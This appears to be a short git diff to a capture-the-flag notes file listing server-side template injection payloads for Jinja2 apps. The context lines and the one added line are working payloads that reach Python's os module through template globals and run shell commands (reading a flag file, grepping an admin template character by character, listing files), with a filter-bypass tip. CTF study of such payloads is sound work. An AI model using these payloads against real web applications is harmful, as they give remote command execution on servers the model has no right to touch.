@@ -170,6 +170,8 @@ Some payloads used earlier in some challenges:
 {{__self__.__init__.__globals__.__builtins__.__import__('os').popen('flag.txt').read()}}
 
 {% if request.application.__globals__.__builtins__.__import__('os').popen('grep -io flag.*\} ./app/templates/admin.html').read().startswith('" + str(x) + "') %} found {% endif %}
+
+{%print(self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read())%} - when {{ does not work use {%print(wodoo)%}
 ```
 
 Further Refrences:
